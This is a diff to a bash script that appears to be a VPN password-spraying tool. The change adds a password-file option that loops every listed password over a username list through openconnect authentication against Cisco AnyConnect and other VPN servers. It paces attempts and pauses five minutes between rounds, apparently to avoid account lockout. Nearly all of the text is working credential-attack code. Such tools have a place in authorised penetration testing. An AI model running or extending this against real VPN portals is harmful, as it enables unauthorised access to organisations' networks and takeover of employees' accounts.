@@ -5,6 +5,7 @@ display_usage() {
 	echo -e "-h, --help\t\tDisplay help text"
 	echo -e "-f\t\t\tSet username file"
 	echo -e "-p\t\t\tSet password to spray"
+	echo -e "-b\t\t\tSet password file to spray"
 	echo -e "-s\t\t\tVPN Server"
 	echo -e "-v\t\t\tVPN Distro"
 	echo -e "\tanyconnect\tCisco AnyConnect SSL VPN"
@@ -32,12 +33,13 @@ display_usage() {
 	fi 
 passAsUser="false"
 password=""
-while getopts 'f:p:s:v:t:c:r:' option
+while getopts 'f:p:b:s:v:t:c:r:' option
 do
 	case "${option}"
 		in
 		f) file="${OPTARG}";;
 		p) password=${OPTARG};;
+		b) password_file=${OPTARG};;
 		s) server=${OPTARG};;
 		v) protocol=${OPTARG};;
 		t) sleeep=${OPTARG};;
@@ -69,15 +71,32 @@ then
 		sleep $sleeep
 	done
 else
-	echo -e "${BLUE}Not spraying username as password${NC}"
-	for i in `cat $file`
-	do 
-		echo -e "${GREEN}%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%${NC}"
-		echo -e "${WHITE}User: " $i "${NC}"
-		echo $password | sudo openconnect $server --user=$i --passwd-on-stdin --protocol=$protocol --authenticate --servercert $cert
-		echo -e "${GREEN}%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%${NC}"
-		printf "\n\n\n"
-		sleep $sleeep
-	done
+	if [ -n "$password_file" ]; then
+		echo -e "${BLUE}Spraying VPN with password file${NC}"
+	  	for j in `cat $password_file`
+	  	do
+	  		for i in `cat $file`
+			do 
+				echo -e "${GREEN}%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%${NC}"
+				echo -e "${WHITE}User: " $i " Password: " $j "${NC}"
+				echo $j | sudo openconnect $server --user=$i --passwd-on-stdin --protocol=$protocol --authenticate --servercert $cert
+				echo -e "${GREEN}%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%${NC}"
+				printf "\n\n\n"
+				sleep $sleeep
+			done
+			echo -e "${BLUE}Sleeping for 5 minutes before next run${NC}"
+			sleep 5m
+		done
+	else
+  		echo -e "${BLUE}Not spraying username as password${NC}"
+		for i in `cat $file`
+		do 
+			echo -e "${GREEN}%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%${NC}"
+			echo -e "${WHITE}User: " $i " Password: " $password "${NC}"
+			echo $password | sudo openconnect $server --user=$i --passwd-on-stdin --protocol=$protocol --authenticate --servercert $cert
+			echo -e "${GREEN}%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%${NC}"
+			printf "\n\n\n"
+			sleep $sleeep
+		done
+	fi
 fi
-
